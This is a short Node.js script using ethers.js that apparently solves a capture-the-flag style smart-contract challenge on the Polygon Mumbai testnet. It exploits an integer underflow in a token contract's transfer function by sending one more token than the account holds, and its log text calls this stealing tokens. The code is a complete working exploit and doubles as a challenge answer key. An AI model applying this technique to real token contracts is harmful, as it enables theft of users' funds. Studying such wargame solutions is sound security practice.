const ethers = require('ethers');
const provider = new ethers.JsonRpcProvider('https://matic-mumbai.chainstacklabs.com');

const contractAbi = [{"inputs":[{"internalType":"uint256","name":"_initialSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"balance","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x70a08231"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x18160ddd"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function","signature":"0xa9059cbb"}];

async function solve(privateKey, contractAddress) {
    const contract = new ethers.Contract(contractAddress, contractAbi, provider);
    const account = new ethers.Wallet(privateKey, provider);

    if (await isSolved(account, contract)) {
        console.log('already solved');
        return;
    }

    const initialBalance = await contract.balanceOf(account.address);
    const transferValue = initialBalance + 1n;

    console.log('transfering tokens...');
    const transferTx = await contract.connect(account).transfer("0x0000000000000000000000000000000000000000", transferValue);
    await transferTx.wait();

    if (await isSolved(account, contract)) {
        console.log('solved');
    } else {
        console.log('could not steal tokens. Something went wrong.');
        process.exit(1);
    }
}

async function isSolved(account, contract) {
    const balance = await contract.balanceOf(account.address);
    return balance > 20;
}

const privateKey = process.argv[2];
if (!privateKey) {
    console.error('private key must be provided as first argument');
    process.exit(1);
}

const contractAddress = process.argv[3];
if (!contractAddress) {
    console.error('contract address must be provided as second argument');
    process.exit(1);
}

solve(privateKey, contractAddress);
